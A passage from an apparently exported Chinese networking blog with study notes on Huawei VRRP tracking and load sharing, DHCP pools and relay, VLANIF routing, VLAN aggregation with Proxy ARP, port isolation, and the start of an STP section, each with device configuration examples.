class="attr">[R1]interface</span> <span class="string">GigabitEthernet0/0/0</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]ip</span> <span class="string">address 192.168.1.252 24</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]vrrp</span> <span class="string">vrid 1 virtual-ip 192.168.1.254</span></span><br></pre></td></tr></table></figure><h2 id="VRRP监控上行接口"><a href="#VRRP监控上行接口" class="headerlink" title="VRRP监控上行接口"></a>VRRP监控上行接口</h2><h3 id="VRRP监视上行端口"><a href="#VRRP监视上行端口" class="headerlink" title="VRRP监视上行端口"></a>VRRP监视上行端口</h3><p><img src="/../img/img_artical/net_sec/5.1.7.png" alt="5.1.7"></p><h3 id="VRRP监视上行端口配置"><a href="#VRRP监视上行端口配置" class="headerlink" title="VRRP监视上行端口配置"></a>VRRP监视上行端口配置</h3><p><strong>配置命令</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1-G0/0/0]vrrp</span> <span class="string">vrid 1 track interface GigabitEthernet0/0/1 reduced 50</span></span><br><span class="line"><span class="attr">//如果R1的g0/0/1接口状态为down那么VRRP的优先级就减去50</span></span><br></pre></td></tr></table></figure><h3 id="上行端口故障恢复"><a href="#上行端口故障恢复" class="headerlink" title="上行端口故障恢复"></a>上行端口故障恢复</h3><p><strong>主路由器故障链路或端口恢复</strong></p><ul><li>主路由器恢复优先级</li><li>主路由器抢占回Master身份，继续转发用户流量</li></ul><p><strong>VRRP默认开启抢占功能</strong></p><ul><li>VRRP在主路由器设备上，必须开启</li></ul><h2 id="VRRP负载分担"><a href="#VRRP负载分担" class="headerlink" title="VRRP负载分担"></a>VRRP负载分担</h2><h3 id="VRRP单组缺陷"><a href="#VRRP单组缺陷" class="headerlink" title="VRRP单组缺陷"></a>VRRP单组缺陷</h3><p><strong>如果每个网段只有一个VRRP备份组</strong></p><ul><li>主路由器数据转发压力大</li><li>备份路由器不转发任何数据</li><li>网络设备利用率低</li></ul><p><img src="/../img/img_artical/net_sec/5.1.8.png" alt="5.1.8"></p><h3 id="VRRP负载分担-1"><a href="#VRRP负载分担-1" class="headerlink" title="VRRP负载分担"></a>VRRP负载分担</h3><p><strong>VRRP负载分担</strong></p><ul><li>创建多个备份组</li><li>每个备份组中都选举Master</li><li>实现流量转发的负载分担</li></ul><p><img src="/../img/img_artical/net_sec/5.1.9.png" alt="5.1.9"></p><h3 id="VRRP负载分担配置"><a href="#VRRP负载分担配置" class="headerlink" title="VRRP负载分担配置"></a>VRRP负载分担配置</h3><p><strong>配置VRRP备份组1</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]interface</span> <span class="string">GigabitEthernet0/0/0</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]ip</span> <span class="string">address 192.168.1.251 24</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]vrrp</span> <span class="string">vrid 1 virtual-ip 192.168.1.254     //配置VRRP虚拟网关地址</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]vrrp</span> <span class="string">vrid 1 priority 130                 //配置VRRP优先级</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]vrrp</span> <span class="string">vrid 1 track int g0/0/1 reduced 50</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R2]interface</span> <span class="string">GigabitEthernet0/0/0</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/0]ip</span> <span class="string">address 192.168.1.252 24</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/0]vrrp</span> <span class="string">vrid 1 virtual-ip 192.168.1.254</span></span><br></pre></td></tr></table></figure><p><strong>配置VRRP备份组2</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]interface</span> <span class="string">GigabitEthernet0/0/0</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]ip</span> <span class="string">address 192.168.1.251 24</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]vrrp</span> <span class="string">vrid 2 virtual-ip 192.168.1.253</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R2]interface</span> <span class="string">GigabitEthernet0/0/0</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/0]ip</span> <span class="string">address 192.168.1.252 24</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/0]vrrp</span> <span class="string">vrid 2 virtual-ip 192.168.1.253     //配置VRRP虚拟网关地址</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/0]vrrp</span> <span class="string">vrid 2 priority 130                 //配置VRRP优先级</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/0]vrrp</span> <span class="string">vrid 2 track int g0/0/1 reduced 50</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 园区网实现与安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-弹性交换网络4</title>
      <link href="/posts/switching4.html"/>
      <url>/posts/switching4.html</url>
      
        <content type="html"><![CDATA[<h1 id="弹性交换网络"><a href="#弹性交换网络" class="headerlink" title="弹性交换网络"></a>弹性交换网络</h1><h2 id="DHCP的应用场景和原理"><a href="#DHCP的应用场景和原理" class="headerlink" title="DHCP的应用场景和原理"></a>DHCP的应用场景和原理</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p><strong>企业网络中，大量的主机或设备需要获取IP地址等网络参数</strong></p><ul><li>如果采用手工配置，工作量大、容易出错且不好管理</li><li>如果用户擅自更改，还有可能会造成IP地址冲突等问题</li></ul><p><strong>使用动态主机配置协议DHCP，来分配IP地址等网络参数，可以减少管理员的工作量，避免出错</strong></p><h3 id="DHCP的定义"><a href="#DHCP的定义" class="headerlink" title="DHCP的定义"></a>DHCP的定义</h3><p><strong>DHCP，Dynamic Host Configuration Protocol</strong></p><ul><li>DHCP：动态主机配置协议</li><li>用于实现企业用户IP地址的动态分配和集中管理</li><li>避免繁琐的手工配置，快速适应网络的变化</li></ul><h3 id="DHCP的角色"><a href="#DHCP的角色" class="headerlink" title="DHCP的角色"></a>DHCP的角色</h3><p><strong>DHCP客户端</strong></p><ul><li>通过DHCP协议请求获取IP地址等网络参数，例如PC、手机、IP电话等</li></ul><p><strong>DHCP服务器</strong></p><ul><li>负责为DHCP客户端分配网络参数</li></ul><p><img src="/../img/img_artical/net_sec/4.4.1.png" alt="4.4.1"></p><p><strong>DHCP中继</strong></p><ul><li>当客户端与服务器不在一个网段的时候，才会用到DHCP中继设备</li><li>负责转发DHCP服务器和DHCP客户端之间的DHCP报文，协助DHCP服务器向DHCP客户端动态分配网络参数的设备</li></ul><p><img src="/../img/img_artical/net_sec/4.4.2.png" alt="4.4.2"></p><h3 id="DHCP工作原理"><a href="#DHCP工作原理" class="headerlink" title="DHCP工作原理"></a>DHCP工作原理</h3><p><strong>客户端首次接入网络从DHCP服务器中获取IP地址，会经过4个阶段</strong></p><ul><li>发现阶段：客户端<strong>广播</strong>发送DHCP Discover报文（<strong>DHCP发现报文</strong>，客户端找DHCP服务器，请求IP地址）</li><li>提供阶段：服务器收到客户端发的报文后，会<strong>单播</strong>回复DHCP Offer报文（<strong>DHCP回应报文</strong>，服务器给客户端发IP地址、网关、DNS等）</li><li>选择阶段：客户端收到Offer报文后，会再次<strong>广播</strong>发送DHCP Request报文（<strong>DHCP请求报文</strong>，客户端广播告知所有的服务器，选择了某某IP地址）</li><li>确认阶段：服务器收到客户端发报文后，会<strong>单播</strong>回复DHCP ACK报文（<strong>DHCP确认报文</strong>，确认分配结果，只有发了ACK报文，客户端才可以使用IP）</li></ul><p><img src="/../img/img_artical/net_sec/4.4.3.png" alt="4.4.3"></p><h2 id="基于全局的DHCP"><a href="#基于全局的DHCP" class="headerlink" title="基于全局的DHCP"></a>基于全局的DHCP</h2><h3 id="创建地址池"><a href="#创建地址池" class="headerlink" title="创建地址池"></a>创建地址池</h3><p><strong>地址池</strong></p><ul><li>DHCP服务器通过地址池为客户端提供IP地址等网络参数</li></ul><p><strong>创建地址池有2种方式</strong></p><ul><li>基于全局的地址池</li><li>基于接口的地址池</li></ul><h3 id="创建基于全局的DHCP"><a href="#创建基于全局的DHCP" class="headerlink" title="创建基于全局的DHCP"></a>创建基于全局的DHCP</h3><ul><li>开启设备的DHCP功能，确保设备为 DHCP 服务器</li><li>在DHCP服务器创建地址池，规划网段&#x2F;网关&#x2F;DNS和租约</li><li>在接收DHCP报文的接口上，开启基于全局的DHCP功能</li></ul><p><img src="/../img/img_artical/net_sec/4.4.4.png" alt="4.4.4"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.开启路由器DHCP功能</span><br><span class="line">[Huawei]sysname dhcp</span><br><span class="line">[dhcp]dhcp enable</span><br><span class="line"></span><br><span class="line">2.在路由器上建立地址池，配置网段/网关/DNS和租约</span><br><span class="line">[dhcp]ip pool p1         //建立地址池并命名</span><br><span class="line">[dhcp-ip-pool-p1]network 192.168.1.0 mask 255.255.255.0</span><br><span class="line">[dhcp-ip-pool-p1]gateway-list 192.168.1.254</span><br><span class="line">[dhcp-ip-pool-p1]dns-list 8.8.8.8</span><br><span class="line">[dhcp-ip-pool-p1]lease day 3      //设置DHCP租约为3天 (默认1天)</span><br><span class="line"></span><br><span class="line">3.为路由器接口G0/0/0配置地址，并在接口上启用DHCP</span><br><span class="line">[dhcp]interface GigabitEthernet0/0/0</span><br><span class="line">[dhcp-GigabitEthernet0/0/0]ip address 192.168.1.254 24</span><br><span class="line">[dhcp-GigabitEthernet0/0/0]dhcp select global       //接口下启用基于全局的DHCP</span><br></pre></td></tr></table></figure><h2 id="基于接口的DHCP"><a href="#基于接口的DHCP" class="headerlink" title="基于接口的DHCP"></a>基于接口的DHCP</h2><h3 id="创建基于接口的DHCP"><a href="#创建基于接口的DHCP" class="headerlink" title="创建基于接口的DHCP"></a>创建基于接口的DHCP</h3><ul><li>开启设备的DHCP功能，确保设备为 DHCP 服务器</li><li>配置基于接口的DHCP地址池，并配置DNS和租约</li><li>在接收DHCP报文的接口上，开启基于接口的DHCP功能</li></ul><p><img src="/../img/img_artical/net_sec/4.4.5.png" alt="4.4.5"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.开启路由器DHCP功能</span><br><span class="line">[Huawei]sysname dhcp</span><br><span class="line">[dhcp]dhcp enable</span><br><span class="line"></span><br><span class="line">2.在接口G0/0/0配置地址，开启基于接口的DHCP</span><br><span class="line">[dhcp]interface GigabitEthernet0/0/0</span><br><span class="line">[dhcp-GigabitEthernet0/0/0]ip address 192.168.1.254 24</span><br><span class="line">[dhcp-GigabitEthernet0/0/0]dhcp select interface       //接口下启用基于接口的DHCP</span><br><span class="line">[dhcp-GigabitEthernet0/0/0]dhcp server dns-list 8.8.8.8</span><br><span class="line">[dhcp-GigabitEthernet0/0/0]dhcp server lease day 3</span><br></pre></td></tr></table></figure><h2 id="DHCP中继代理"><a href="#DHCP中继代理" class="headerlink" title="DHCP中继代理"></a>DHCP中继代理</h2><h3 id="DHCP中继概述"><a href="#DHCP中继概述" class="headerlink" title="DHCP中继概述"></a>DHCP中继概述</h3><p><strong>场景：</strong></p><ul><li>DHCP客户端与DHCP服务器不在一个网段时，才需要DHCP中继</li></ul><p><strong>作用</strong></p><ul><li>传递DHCP服务器和DHCP客户端之间的DHCP报文</li></ul><p><img src="/../img/img_artical/net_sec/4.4.7.png" alt="4.4.7"></p><h3 id="DHCP中继配置"><a href="#DHCP中继配置" class="headerlink" title="DHCP中继配置"></a>DHCP中继配置</h3><ul><li>DHCP客户端的网关接口，才有资格成为DHCP中继</li><li>开启DHCP中继的DHCP功能</li><li>设置DHCP中继接口的模式为 relay</li><li>指定DHCP中继接口的DHCP服务器地址</li></ul><p><img src="/../img/img_artical/net_sec/4.4.8.png" alt="4.4.8"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">1.配置设备之间的互联接口及静态路由</span></span><br><span class="line"><span class="attr">[R2]interface</span> <span class="string">GigabitEthernet 0/0/0</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/0]ip</span> <span class="string">address 10.10.10.2 24</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/0]quit</span></span><br><span class="line"><span class="attr">[R2]interface</span> <span class="string">GigabitEthernet 0/0/1</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/1]ip</span> <span class="string">address 192.168.1.254 24</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/1]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">GigabitEthernet 0/0/0</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]ip</span> <span class="string">address 10.10.10.1 24</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]quit</span></span><br><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 192.168.1.0 24 10.10.10.2</span></span><br><span class="line"></span><br><span class="line"><span class="attr">2.在R1上配置DHCP地址池，启用DHCP</span></span><br><span class="line"><span class="attr">[R1]dhcp</span> <span class="string">enable</span></span><br><span class="line"><span class="attr">[R1]ip</span> <span class="string">pool ntd</span></span><br><span class="line"><span class="attr">[R1-ip-pool-ntd]network</span> <span class="string">192.168.1.0 mask 255.255.255.0</span></span><br><span class="line"><span class="attr">[R1-ip-pool-ntd]gateway-list</span> <span class="string">192.168.1.254</span></span><br><span class="line"><span class="attr">[R1-ip-pool-ntd]dns-list</span> <span class="string">8.8.8.8</span></span><br><span class="line"><span class="attr">[R1-ip-pool-ntd]excluded-ip-address</span> <span class="string">192.168.1.253        //排除的IP地址</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">GigabitEthernet 0/0/0</span></span><br><span class="line"><span class="attr">[R1-GigabitEthernet0/0/0]dhcp</span> <span class="string">select global     //开启基于全局的DHCP</span></span><br><span class="line"></span><br><span class="line"><span class="attr">3.在R2上配置DHCP中继</span></span><br><span class="line"><span class="attr">[R2]dhcp</span> <span class="string">enable</span></span><br><span class="line"><span class="attr">[R2]interface</span> <span class="string">GigabitEthernet 0/0/1</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/1]dhcp</span> <span class="string">select relay     //在接口G0/0/1上应用DHCP中继功能</span></span><br><span class="line"><span class="attr">[R2-GigabitEthernet0/0/1]dhcp</span> <span class="string">relay server-ip 10.10.10.1   //指向DHCP服务器的IP地址</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 弹性交换网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-弹性交换网络3</title>
      <link href="/posts/switching3.html"/>
      <url>/posts/switching3.html</url>
      
        <content type="html"><![CDATA[<h1 id="弹性交换网络"><a href="#弹性交换网络" class="headerlink" title="弹性交换网络"></a>弹性交换网络</h1><h2 id="VLAN间通信"><a href="#VLAN间通信" class="headerlink" title="VLAN间通信"></a>VLAN间通信</h2><h3 id="VLANIF虚接口"><a href="#VLANIF虚接口" class="headerlink" title="VLANIF虚接口"></a>VLANIF虚接口</h3><p><strong>三层交换机</strong></p><ul><li>具备路由功能的交换机，称之为三层交换机或多层交换机</li></ul><p><strong>VLAN间通信解决方案：VLANIF虚接口</strong></p><p><strong>VLANIF虚接口</strong></p><ul><li>每个VLAN都对应一个VLANIF接口</li><li>VLANIF接口是一种三层虚拟接口，可以实现VLAN间的三层互通</li><li>给每个VLAN需要配置一个VLANIF虚接口，配置接口IP地址，作为VLAN内主机的网关地址</li><li>VLANIF接口不占用额外的物理端口资源，节约成本通常在三层交换机上配置VLANIF接口，来实现VLAN间通信</li></ul><p><strong>三层交换机VLAN间通信的转发过程</strong></p><p><img src="/../img/img_artical/net_sec/4.3.1.png" alt="4.3.1"></p><h3 id="VLANIF虚接口配置"><a href="#VLANIF虚接口配置" class="headerlink" title="VLANIF虚接口配置"></a>VLANIF虚接口配置</h3><p><strong>VLANIF虚接口配置</strong></p><ul><li>在三层交换机上创建VLAN</li><li>为每个VLAN创建网关接口-VLANIF</li><li>为每个VLANIF配置网关IP地址</li><li>如有需要，还须在三层交换机上配置路由</li></ul><p><strong>要求实现不同VLAN间互通</strong></p><ul><li>创建VLAN、接口加入VLAN</li><li>配置VLANIF虚接口IP地址</li></ul><p><img src="/../img/img_artical/net_sec/4.3.2.png" alt="4.3.2"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">1.创建VLAN、接口加入VLAN</span></span><br><span class="line"><span class="attr">[SWl]vlan</span> <span class="string">batch 2 3</span></span><br><span class="line"><span class="attr">[SWl]interface</span> <span class="string">g0/0/1</span></span><br><span class="line"><span class="attr">[SW1-G0/0/1]port</span> <span class="string">link-type access</span></span><br><span class="line"><span class="attr">[SW1-G0/0/1]port</span> <span class="string">default vlan 1</span></span><br><span class="line"><span class="attr">[SWlJinterface</span> <span class="string">g0/0/2</span></span><br><span class="line"><span class="attr">[SW1-G0/0/2]port</span> <span class="string">link-type access</span></span><br><span class="line"><span class="attr">[SW1-G0/0/2]port</span> <span class="string">default vlan 2</span></span><br><span class="line"><span class="attr">[SWl]interface</span> <span class="string">g0/0/3</span></span><br><span class="line"><span class="attr">[SW1-G0/0/3]port</span> <span class="string">link-type access</span></span><br><span class="line"><span class="attr">[SW1-G0/0/3]port</span> <span class="string">default vlan 3</span></span><br><span class="line"></span><br><span class="line"><span class="attr">2.配置VLANIF虚接口IP-网关地址</span></span><br><span class="line"><span class="attr">[SW1]interface</span> <span class="string">Vlanif 1</span></span><br><span class="line"><span class="attr">[SW1-Vlanif1]ip</span> <span class="string">address 192.168.1.254 24</span></span><br><span class="line"><span class="attr">[SW1]interface</span> <span class="string">Vlanif 2</span></span><br><span class="line"><span class="attr">[SW1-Vlanif2]ip</span> <span class="string">address 192.168.2.254 24</span></span><br><span class="line"><span class="attr">[SW1]interface</span> <span class="string">Vlanif 3</span></span><br><span class="line"><span class="attr">[SW1-Vlanif3]ip</span> <span class="string">address 192.168.3.254 24</span></span><br></pre></td></tr></table></figure><h2 id="VLAN聚合原理及配置"><a href="#VLAN聚合原理及配置" class="headerlink" title="VLAN聚合原理及配置"></a>VLAN聚合原理及配置</h2><h3 id="VLAN聚合基本概念"><a href="#VLAN聚合基本概念" class="headerlink" title="VLAN聚合基本概念"></a>VLAN聚合基本概念</h3><p><strong>VLAN聚合（VLAN Aggregation，也称SuperVLAN）</strong></p><ul><li>指在一个物理网络内，用多个VLAN（称为Sub-VLAN）隔离广播域</li><li>这些Sub-VLAN聚合成一个逻辑的VLAN（称为Super VLAN）</li><li>这些Sub-VLAN使用同一个IP子网和缺省网关，可以节约IP地址资源</li></ul><p><strong>Super VLAN：超级VLAN</strong></p><p><strong>Sub-VLAN：子VLAN</strong></p><h3 id="多VLAN中IP地址浪费问题"><a href="#多VLAN中IP地址浪费问题" class="headerlink" title="多VLAN中IP地址浪费问题"></a>多VLAN中IP地址浪费问题</h3><p><strong>VLAN越多，IP地址浪费越多</strong></p><ul><li>一个VLAN中，网络号、广播地址、网关地址都不能分配给主机使用</li><li>且一个VLAN中实际主机数量过少，也要分配一个单独的网段</li></ul><p><img src="/../img/img_artical/net_sec/4.3.3.png" alt="4.3.3"></p><h3 id="VLAN聚合作用"><a href="#VLAN聚合作用" class="headerlink" title="VLAN聚合作用"></a>VLAN聚合作用</h3><p><strong>在多VLAN的网络环境中，节省IP地址</strong></p><ul><li>每个Sub-VLAN对应一个广播域，多个Sub-VLAN和一个Super-VLAN关联，只给Super-VLAN分配一个IP网段，所有Sub-VLAN都使用Super-VLAN的IP网段进行三层通信，从而节省IP地址</li></ul><p><img src="/../img/img_artical/net_sec/4.3.4.png" alt="4.3.4"></p><h3 id="Sub-VLAN"><a href="#Sub-VLAN" class="headerlink" title="Sub-VLAN"></a>Sub-VLAN</h3><p><strong>Sub-VLAN</strong></p><ul><li>只包含物理接口，不能建立三层VLANIF接口</li><li>Sub-VLAN用于隔离广播域</li><li>每个Sub-VLAN内的主机与外部的三层通信是靠Super-VLAN的三层VLANIF接口来实现的</li></ul><h3 id="Super-VLAN"><a href="#Super-VLAN" class="headerlink" title="Super-VLAN"></a>Super-VLAN</h3><p><strong>Super-VLAN</strong></p><ul><li>Super-VLAN只建立三层VLANIF接口，不包含物理接口，与网关对应</li><li>一个Super-VLAN可以包含一个或多个Sub-VLAN</li><li>Sub-VLAN不再占用一个独立的子网网段</li><li>在同一个Super-VLAN中，无论主机属于哪一个Sub-VLAN，它的IP地址都在Super-VLAN对应的网段内</li></ul><h3 id="Sub-VLAN之间的通信存在问题"><a href="#Sub-VLAN之间的通信存在问题" class="headerlink" title="Sub-VLAN之间的通信存在问题"></a>Sub-VLAN之间的通信存在问题</h3><p><strong>存在问题</strong></p><ul><li>普通VLAN中，不同VLAN内的主机可以通过各自不同网关进行三层互通</li><li>但是Super-VLAN中，所有Sub-VLAN内的主机使用的是同一个网段的地址，共用同一个网关地址，主机只会做二层转发，而不会送网关进行三层转发</li><li>不同Sub-VLAN的主机，在二层是相互隔离的，这就造成了Sub-VLAN间无法通信的问题</li></ul><h3 id="Sub-VLAN之间的通信解决方案"><a href="#Sub-VLAN之间的通信解决方案" class="headerlink" title="Sub-VLAN之间的通信解决方案"></a>Sub-VLAN之间的通信解决方案</h3><p><strong>解决方案</strong></p><ul><li>解决这一问题的方法就是使用Proxy ARP</li></ul><p><strong>Proxy ARP</strong></p><ul><li>如果ARP请求是从一个网络的主机发往同一网段但不在同一VLAN（同一广播域）内的另一台主机，那么连接这两个网络的设备就可以回答该ARP请求，这个过程称作ARP代理（Proxy ARP）</li><li>VLAN间Proxy ARP：两台主机处于相同网段，但属于不同VLAN</li></ul><h3 id="Sub-VLAN配置"><a href="#Sub-VLAN配置" class="headerlink" title="Sub-VLAN配置"></a>Sub-VLAN配置</h3><p><strong>VLAN角色类型</strong></p><ul><li>Sub-VLAN</li><li>Super-VLAN</li></ul><p><strong>Sub-VLAN配置</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[SW1]vlan</span> <span class="string">2</span></span><br><span class="line"><span class="attr">[SW1]interface</span> <span class="string">Ethernet0/0/1</span></span><br><span class="line"><span class="attr">[SW1-E0/0/1]port</span> <span class="string">link-type access</span></span><br><span class="line"><span class="attr">[SW1-E0/0/1]port</span> <span class="string">default vlan 2</span></span><br></pre></td></tr></table></figure><p><strong>Super-VLAN配置</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[SW1]vlan</span> <span class="string">10                                             //创建vlan10</span></span><br><span class="line"><span class="attr">[SW1-vlan-10]aggregate-vlan</span>                              <span class="string">//配置vlan10为Super-vlan</span></span><br><span class="line"><span class="attr">[SW1-vlan-10]access-vlan2</span>                                <span class="string">//将Sub-vlan vlan2加入Super-vlan</span></span><br><span class="line"><span class="attr">[SW1]interface</span> <span class="string">vlanif 10</span></span><br><span class="line"><span class="attr">[SW1-vlanif-10]ip</span> <span class="string">address 192.168.10.254 24</span></span><br><span class="line"><span class="attr">[SW1-vlanif-10]arp-proxy</span> <span class="string">inter-sub-vlan-proxy enable     //开启Proxy ARP</span></span><br></pre></td></tr></table></figure><h3 id="VLAN聚合配置思路"><a href="#VLAN聚合配置思路" class="headerlink" title="VLAN聚合配置思路"></a>VLAN聚合配置思路</h3><p><strong>配置思路</strong></p><ul><li>创建Sub-VLAN</li><li>配置端口模式</li><li>端口加入VLAN</li><li>创建Super-VLAN</li><li>将Sub-VLAN加入SuperVLAN</li><li>配置Super-VLAN的VLANIF接口</li><li>Super-VLAN下配置Proxy ARP</li><li>验证设备之间的互通性</li></ul><h2 id="端口隔离原理与配置"><a href="#端口隔离原理与配置" class="headerlink" title="端口隔离原理与配置"></a>端口隔离原理与配置</h2><h3 id="端口隔离概述"><a href="#端口隔离概述" class="headerlink" title="端口隔离概述"></a>端口隔离概述</h3><ul><li><p>实现报文之间的2层隔离，除了使用VLAN 技术以后，还可以使用端口隔离技术</p></li><li><p>采用该技术后，属于同一个VLAN 内的端口所连接的设备也可以实现通信的隔离</p></li><li><p>端口隔离为用户提供了更加安全、更加灵活的组网方案</p></li><li><p>端口隔离的作用：采用端口隔离功能，可以实现同一VLAN内端口之间的隔离</p></li><li><p>如何实现端口隔离功能：只需要将端口加入到隔离组中，就可以实现隔离组内端口之间二层数据的隔离</p></li><li><p>端口隔离的优势：节约了VLAN，提供了更安全、更灵活的组网方案</p></li></ul><h3 id="端口隔离的特点"><a href="#端口隔离的特点" class="headerlink" title="端口隔离的特点"></a>端口隔离的特点</h3><ul><li>端口隔离只是针对同一设备上的端口隔离组成员，对于不同设备上的接口而言，无法实现该功能</li><li>同一端口隔离组的接口之间互相隔离</li><li>隔离组的接口和其他接口之间不隔离</li><li>不同端口隔离组的接口之间不隔离</li></ul><h3 id="端口隔离应用场景"><a href="#端口隔离应用场景" class="headerlink" title="端口隔离应用场景"></a>端口隔离应用场景</h3><p><img src="/../img/img_artical/net_sec/4.3.5.png" alt="4.3.5"></p><h3 id="端口隔离基本概念"><a href="#端口隔离基本概念" class="headerlink" title="端口隔离基本概念"></a>端口隔离基本概念</h3><p><img src="/../img/img_artical/net_sec/4.3.6.png" alt="4.3.6"></p><h3 id="端口隔离配置实现"><a href="#端口隔离配置实现" class="headerlink" title="端口隔离配置实现"></a>端口隔离配置实现</h3><p><img src="/../img/img_artical/net_sec/4.3.7.png" alt="4.3.7"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 弹性交换网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-弹性交换网络2</title>
      <link href="/posts/switching2.html"/>
      <url>/posts/switching2.html</url>
      
        <content type="html"><![CDATA[<h1 id="弹性交换网络"><a href="#弹性交换网络" class="headerlink" title="弹性交换网络"></a>弹性交换网络</h1><h2 id="STP协议概述"><a href="#STP协议概述" class="headerlink" title="STP协议概述"></a>STP协议概述</h2><h3 id="单点故障"><a href="#单点故障" class="headerlink" title="单点故障"></a>单点故障</h3><p><strong>PC之间的互通链路仅仅存在1个</strong></p><ul><li>任何一条链路出现问题，PC之间都会无法通信</li></ul><p><img src="/../img/img_artical/net_sec/4.2.1.png" alt="4.2.1"></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p><strong>提高网络可靠性</strong></p><ul><li>增加冗余&#x2F;备份链路</li></ul><p><img src="/../img/img_artical/net_sec/4.2.2.png" alt="4.2.2"></p><h3 id="产生新的问题"><a href="#产生新的问题" class="headerlink" title="产生新的问题"></a>产生新的问题</h3><p><strong>增加备份链路后交换网络上产生二层环路</strong></p><ul><li><p>PC1访问PC2，PC1知道PC2的IP地址，但是不知识PC2的MAC地址</p></li><li><p>PC1会发送ARP广播(目的MAC为全FFFF数据)</p></li></ul><p><img 